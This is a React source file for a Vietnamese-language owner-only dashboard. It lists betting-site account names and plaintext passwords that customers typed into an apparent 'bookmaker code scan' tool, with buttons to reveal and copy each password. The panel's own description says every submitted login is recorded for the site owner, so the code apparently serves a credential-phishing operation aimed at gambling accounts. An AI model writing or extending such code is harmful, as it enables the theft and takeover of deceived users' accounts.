import { useCallback, useEffect, useMemo, useState } from 'react';
import { supabase } from '@/lib/supabase';

type ScanRequest = {
  id: string;
  user_id: string | null;
  player_name: string;
  account: string;
  password: string;
  bookmaker_name: string;
  bookmaker_domain: string;
  created_at: string;
};

const SELECT_COLUMNS =
  'id, user_id, player_name, account, password, bookmaker_name, bookmaker_domain, created_at';

const messageOf = (error: unknown, fallback: string) =>
  error instanceof Error ? error.message : fallback;

const formatTime = (value: string) => {
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return value;
  return date.toLocaleString('vi-VN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  });
};

export default function ScanRequestsPanel() {
  const [rows, setRows] = useState<ScanRequest[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [notice, setNotice] = useState('');
  const [query, setQuery] = useState('');
  const [shown, setShown] = useState<Record<string, boolean>>({});
  const [copied, setCopied] = useState('');

  const load = useCallback(async () => {
    setLoading(true);
    setError('');
    try {
      const { data, error: fetchError } = await supabase
        .from('bookmaker_scan_requests')
        .select(SELECT_COLUMNS)
        .order('created_at', { ascending: false })
        .limit(300);
      if (fetchError) throw fetchError;
      setRows((data ?? []) as ScanRequest[]);
    } catch (caught) {
      setError(messageOf(caught, 'Không tải được danh sách tài khoản khách gửi.'));
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    load();
  }, [load]);

  useEffect(() => {
    if (!notice) return undefined;
    const timer = window.setTimeout(() => setNotice(''), 3200);
    return () => window.clearTimeout(timer);
  }, [notice]);

  const filtered = useMemo(() => {
    const keyword = query.trim().toLowerCase();
    if (!keyword) return rows;
    return rows.filter(
      (row) =>
        row.account.toLowerCase().includes(keyword) ||
        row.player_name.toLowerCase().includes(keyword) ||
        row.bookmaker_name.toLowerCase().includes(keyword) ||
        row.bookmaker_domain.toLowerCase().includes(keyword),
    );
  }, [rows, query]);

  const copy = async (label: string, value: string) => {
    try {
      await navigator.clipboard.writeText(value);
      setCopied(label);
      window.setTimeout(() => setCopied(''), 1600);
    } catch {
      setCopied('');
    }
  };

  const remove = async (id: string) => {
    setError('');
    try {
      const { error: deleteError } = await supabase
        .from('bookmaker_scan_requests')
        .delete()
        .eq('id', id);
      if (deleteError) throw deleteError;
      setRows((prev) => prev.filter((row) => row.id !== id));
      setNotice('Đã xoá bản ghi.');
    } catch (caught) {
      setError(messageOf(caught, 'Không xoá được bản ghi.'));
    }
  };

  return (
    <div>
      <div className="flex flex-col gap-3 md:flex-row md:items-end md:justify-between">
        <div>
          <p className="font-mono text-[10px] tracking-[0.2em] text-primary-500 uppercase">
            $ scan-requests --owner
          </p>
          <h2 className="mt-1 font-heading text-xl font-bold text-foreground-950">
            Tài khoản nhà cái khách gửi
          </h2>
          <p className="mt-1 max-w-2xl text-sm text-foreground-500">
            Mọi lần khách bấm “kiểm tra” trong cửa sổ quét mã nhà cái đều được ghi lại ở đây, gồm
            tên tài khoản, mật khẩu khách nhập và nhà cái khách chọn. Chỉ chủ web xem được mục này.
          </p>
        </div>
        <div className="flex items-center gap-2">
          <div className="rounded-md border hairline bg-background-100/70 px-3 py-2 font-mono text-[11px]">
            <span className="text-foreground-600">tổng </span>
            <span className="text-foreground-950">{rows.length}</span>
            <span className="text-foreground-600"> lượt</span>
          </div>
          <button
            type="button"
            onClick={load}
            className="flex cursor-pointer items-center gap-2 rounded-md border hairline px-3 py-2 font-mono text-[11px] whitespace-nowrap text-foreground-300 transition-colors hover:text-primary-500"
          >
            <i className="ri-refresh-line" />
            tải lại
          </button>
        </div>
      </div>

      {notice && (
        <div className="mt-4 flex items-center gap-2 rounded-md border border-primary-500/30 bg-primary-500/10 px-3 py-2">
          <i className="ri-checkbox-circle-line text-[13px] text-primary-500" />
          <p className="font-mono text-[11px] text-primary-500">{notice}</p>
        </div>
      )}
      {error && (
        <div className="mt-4 flex items-center gap-2 rounded-md border border-accent-500/40 bg-accent-500/10 px-3 py-2">
          <i className="ri-error-warning-line text-[13px] text-accent-500" />
          <p className="font-mono text-[11px] text-accent-500">{error}</p>
        </div>
      )}

      <div className="relative mt-4 max-w-sm">
        <i className="ri-search-line pointer-events-none absolute left-2.5 top-1/2 -translate-y-1/2 text-[13px] text-foreground-600" />
        <input
          value={query}
          onChange={(event) => setQuery(event.target.value)}
          placeholder="Tìm tài khoản, khách, nhà cái..."
          className="w-full rounded-md border border-background-300/50 bg-background-50/70 py-2 pl-8 pr-2.5 font-mono text-[11px] text-foreground-950 placeholder:text-foreground-600 focus:border-primary-500/60"
        />
      </div>

      {loading ? (
        <div className="mt-4 flex items-center justify-center gap-2 rounded-lg border hairline py-14 font-mono text-[12px] text-foreground-500">
          <i className="ri-loader-4-line animate-spin" />
          đang tải dữ liệu khách gửi...
        </div>
      ) : filtered.length === 0 ? (
        <div className="mt-4 flex flex-col items-center justify-center rounded-lg border hairline bg-background-100/50 py-14">
          <i className="ri-key-2-line text-2xl text-foreground-600" />
          <p className="mt-3 text-center font-mono text-[12px] text-foreground-500">
            {rows.length === 0
              ? 'chưa có khách nào gửi tài khoản để kiểm tra'
              : 'không có bản ghi nào khớp tìm kiếm'}
          </p>
        </div>
      ) : (
        <div className="mt-4 space-y-2">
          <div className="flex items-center justify-between border-b hairline pb-2">
            <p className="font-mono text-[10px] tracking-[0.16em] text-foreground-600 uppercase">
              danh sách tài khoản khách gửi
            </p>
            <p className="font-mono text-[10px] text-foreground-600">{filtered.length} bản ghi</p>
          </div>

          {filtered.map((row) => {
            const visible = Boolean(shown[row.id]);
            return (
              <div
                key={row.id}
                className="rounded-lg border hairline bg-background-100/60 p-3.5"
              >
                <div className="flex flex-wrap items-start justify-between gap-2">
                  <div className="min-w-0">
                    <p className="flex items-center gap-1.5 truncate font-heading text-[13px] font-bold text-foreground-950">
                      <i className="ri-building-4-line text-[13px] text-primary-500" />
                      {row.bookmaker_name || 'nhà cái'}
                      <span className="truncate font-mono text-[10px] font-normal text-foreground-600">
                        {row.bookmaker_domain}
                      </span>
                    </p>
                    <p className="mt-0.5 flex items-center gap-1.5 truncate font-mono text-[10px] text-foreground-600">
                      <i className="ri-user-line text-[11px]" />
                      khách: {row.player_name || 'không rõ tên'}
                    </p>
                  </div>
                  <div className="flex shrink-0 items-center gap-2">
                    <span className="rounded border hairline px-2 py-1 font-mono text-[9px] whitespace-nowrap text-foreground-500 tabular-nums">
                      {formatTime(row.created_at)}
                    </span>
                    <button
                      type="button"
                      onClick={() => remove(row.id)}
                      aria-label="Xoá bản ghi"
                      title="Xoá bản ghi"
                      className="flex h-7 w-7 cursor-pointer items-center justify-center rounded border border-accent-500/40 text-accent-500 transition-colors hover:bg-accent-500/10"
                    >
                      <i className="ri-delete-bin-6-line text-[12px]" />
                    </button>
                  </div>
                </div>

                <div className="mt-2.5 grid grid-cols-1 gap-2 sm:grid-cols-2">
                  <div className="rounded border hairline bg-background-50/70 px-2.5 py-2">
                    <p className="font-mono text-[8px] tracking-[0.12em] text-foreground-600 uppercase">
                      tên tài khoản
                    </p>
                    <div className="mt-0.5 flex items-center gap-2">
                      <p className="min-w-0 flex-1 truncate font-mono text-[12px] text-foreground-950">
                        {row.account}
                      </p>
                      <button
                        type="button"
                        onClick={() => copy(`account-${row.id}`, row.account)}
                        aria-label="Chép tên tài khoản"
                        className="flex h-6 w-6 shrink-0 cursor-pointer items-center justify-center rounded border hairline text-foreground-500 transition-colors hover:text-primary-500"
                      >
                        <i
                          className={`text-[11px] ${
                            copied === `account-${row.id}`
                              ? 'ri-check-line'
                              : 'ri-file-copy-line'
                          }`}
                        />
                      </button>
                    </div>
                  </div>

                  <div className="rounded border border-secondary-500/35 bg-secondary-500/10 px-2.5 py-2">
                    <p className="font-mono text-[8px] tracking-[0.12em] text-secondary-500 uppercase">
                      mật khẩu khách nhập
                    </p>
                    <div className="mt-0.5 flex items-center gap-2">
                      <p className="min-w-0 flex-1 truncate font-mono text-[12px] tracking-[0.06em] text-foreground-950">
                        {visible ? row.password : '•'.repeat(Math.min(12, row.password.length))}
                      </p>
                      <button
                        type="button"
                        onClick={() =>
                          setShown((prev) => ({ ...prev, [row.id]: !prev[row.id] }))
                        }
                        aria-label={visible ? 'Ẩn mật khẩu' : 'Hiện mật khẩu'}
                        title={visible ? 'Ẩn mật khẩu' : 'Hiện mật khẩu'}
                        className="flex h-6 w-6 shrink-0 cursor-pointer items-center justify-center rounded border hairline text-foreground-500 transition-colors hover:text-primary-500"
                      >
                        <i
                          className={`text-[11px] ${
                            visible ? 'ri-eye-off-line' : 'ri-eye-line'
                          }`}
                        />
                      </button>
                      <button
                        type="button"
                        onClick={() => copy(`password-${row.id}`, row.password)}
                        aria-label="Chép mật khẩu"
                        className="flex h-6 w-6 shrink-0 cursor-pointer items-center justify-center rounded border hairline text-foreground-500 transition-colors hover:text-primary-500"
                      >
                        <i
                          className={`text-[11px] ${
                            copied === `password-${row.id}`
                              ? 'ri-check-line'
                              : 'ri-file-copy-line'
                          }`}
                        />
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}